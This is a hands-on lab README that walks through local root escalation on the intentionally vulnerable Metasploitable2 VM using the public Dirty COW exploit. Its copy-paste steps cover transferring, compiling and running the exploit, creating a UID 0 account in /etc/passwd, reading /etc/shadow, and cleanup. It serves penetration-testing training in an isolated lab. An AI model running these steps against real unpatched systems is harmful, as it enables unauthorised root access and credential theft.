# Dirty COW (CVE-2016-5195) — Linux Privilege Escalation (Metasploitable2)

> **Project:** Privilege escalation on Metasploitable2 using the Dirty COW exploit (40839.c)


---

## Summary
This is a hands-on lab demonstrating local Linux privilege escalation using the Dirty COW vulnerability (CVE-2016-5195) on the intentionally vulnerable Metasploitable2 VM. The goal was to obtain root privileges from a low-privileged account (`msfadmin`) by transferring, compiling, and running a public exploit (Exploit-DB ID 40839), validating root access, and restoring modified system files.

This README is GitHub-ready and documents the exact steps and commands executed during the lab (where to run them, expected output, and troubleshooting notes).

**WARNING / Ethics:** Only run these steps in a controlled lab environment you own or have explicit permission to test. Never run exploits against systems you do not own.

---

## Lab environment
- Attacker VM: **Kali Linux** (your workstation)
- Target VM: **Metasploitable2** (vulnerable Linux VM)
- Default credentials for Metasploitable2 used in this lab:
  - username: `msfadmin`
  - password: `msfadmin`

Network: Host-Only or Internal network so the lab is isolated from production networks.

---

## Files referenced in this README
- Exploit source (Exploit-DB): `/usr/share/exploitdb/exploits/linux/local/40839.c`
- Destination on target: `/tmp/40839.c`
- Compiled exploit binary: `/tmp/cowroot` (or `cowroot`)
- Backup of original passwd: `/tmp/passwd.bak`

---

## Full step-by-step walkthrough
Below are the precise commands (copy-paste ready) and where to run them. Each command includes a short plain-English explanation.

> **Notation:**
> - `Kali` = type on the Kali Linux attacker terminal
> - `Target` = type on the Metasploitable2 shell (the SSH session you opened from Kali)

### 1. Connect to Metasploitable2 (open an interactive SSH shell)
**On Kali:**
```bash
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 \
    -oHostKeyAlgorithms=+ssh-rsa \
    msfadmin@<Metasploitable-IP>
```
- Explanation: Force legacy SSH KEX/host-key algorithms so the modern SSH client can negotiate with the old OpenSSH server on Metasploitable2. Replace `<Metasploitable-IP>` with your VM IP (example `192.168.61.129`).
- Expected: Password prompt → type `msfadmin`. After successful login you have an interactive shell on the target (prompt like `msfadmin@metasploitable:~$`).


### 2. Transfer the exploit from Kali to Metasploitable2
**On Kali:**
```bash
scp -oKexAlgorithms=+diffie-hellman-group1-sha1 \
    -oHostKeyAlgorithms=+ssh-rsa \
    /usr/share/exploitdb/exploits/linux/local/40839.c \
    msfadmin@<Metasploitable-IP>:/tmp/
```
- Explanation: Secure copy the exploit file into `/tmp/` on the target. The `-o` flags are required to handle old SSH algorithms.
- Expected: File copied, prompt for `msfadmin` password.

> **Alternative (if scp fails):**
> - Start a simple HTTP server on Kali:
> ```bash
> cd /usr/share/exploitdb/exploits/linux/local/
> python3 -m http.server 8080
> ```
> - Then on the Target (Metasploitable):
> ```bash
> cd /tmp
> wget http://<Kali-IP>:8080/40839.c
> ```


### 3. Verify the exploit file on the target
**On Target:**
```bash
cd /tmp
ls -l 40839.c
```
- Explanation: Confirm the exploit file exists in `/tmp`.
- Expected output: a listing showing `40839.c` and its file size.


### 4. Compile the exploit on the target
**On Target:**
```bash
gcc -pthread 40839.c -o cowroot -lcrypt
```
- Explanation: `gcc` compiles the C source into an executable called `cowroot`. `-pthread` enables thread support required by the exploit. `-lcrypt` links the `crypt()` library (prevents "undefined reference to `crypt'\" errors).
- If your linker complains or the build still fails, try the alternate order:
```bash
gcc 40839.c -o cowroot -pthread -lcrypt
```
- Expected: No linker errors; `cowroot` binary created.

**If compilation fails on the target** (e.g., due to missing libraries), use the fallback:
- **On Kali (compile locally):**
```bash
gcc -pthread /usr/share/exploitdb/exploits/linux/local/40839.c -o cowroot -lcrypt
ls -l cowroot
```
- Then copy the compiled binary to the target:
```bash
scp -oKexAlgorithms=+diffie-hellman-group1-sha1 \
    -oHostKeyAlgorithms=+ssh-rsa \
    cowroot msfadmin@<Metasploitable-IP>:/tmp/
```
- On Target:
```bash
cd /tmp
ls -l cowroot
chmod +x cowroot
```


### 5. Run the exploit (on the target)
**On Target:**
```bash
./cowroot
```
- Explanation: Runs the Dirty COW exploit. The exploit will back up `/etc/passwd`, inject a new UID 0 entry (a root-equivalent account), and print the new account credentials.
- Example output (what you might see):
```
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password:
Complete line:
firefart:fiKpA4ofhDWdo:0:0:pwned:/root:/bin/bash
...
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'root123'.

DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
```
- Note: The exploit may prompt you to enter a new password; type a password (it will not echo).


### 6. Switch to the new root-equivalent user and verify
**On Target:**
```bash
su firefart
# When prompted for password -> enter the new password (e.g., root123)
whoami
id
```
- Explanation: `su` switches user; `whoami`/`id` confirm you have UID 0.
- Expected: `whoami` returns `firefart` and `id` shows `uid=0(firefart) gid=0(root)`.


### 7. Validate root-only actions
**On Target:**
```bash
cat /etc/shadow | head
ls -la /root
```
- Explanation: These commands show files only root can normally read — confirming you have root access.


### 8. Restore original passwd file (cleanup)
**On Target:**
```bash
mv /tmp/passwd.bak /etc/passwd
```
- Explanation: Restores the original `/etc/passwd` to leave the target in its pre-exploit state. Keep the backup until you have captured evidence (screenshots/outputs) for reporting.


### 9. Post-exploitation evidence & cleanup commands
**On Target:**
```bash
# Save terminal session log (optional)
script /tmp/escalation_session.log
# run whatever commands you want to record, then type CTRL-D or 'exit' to stop the script

# Save command history to a file
history > /tmp/commands_used.txt

# Clean temporary binaries if compiled on target
rm -f /tmp/cowroot /tmp/40839.c
```


---

## Troubleshooting & common errors
- **`scp` \"unable to negotiate\"**: Use the `-oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa` options with `scp` and `ssh` to force legacy algorithms.
- **`undefined reference to 'crypt'` when compiling:** Link with `-lcrypt` (e.g., `gcc -pthread 40839.c -o cowroot -lcrypt`).
- **`cowroot` not produced after compilation:** Ensure `40839.c` exists in the directory (`ls -l 40839.c`). Confirm you are compiling on the Target shell (not inside a Metasploit session or on Kali unless you intend to use the fallback).
- **No `gcc` on target:** Either install `build-essential` on the target (if allowed) or compile on Kali and transfer the binary via `scp` with legacy `-o` options.

---

## What we observed (example output)
- After `./cowroot`, exploit printed that `/etc/passwd` was backed up and a new UID 0 user `firefart` was created.
- Logging in with `su firefart` and the chosen password returned a root shell:
```
# whoami
firefart
# id
uid=0(firefart) gid=0(root) groups=0(root)
```

This is enough proof for a penetration testing report that privilege escalation to root was possible.




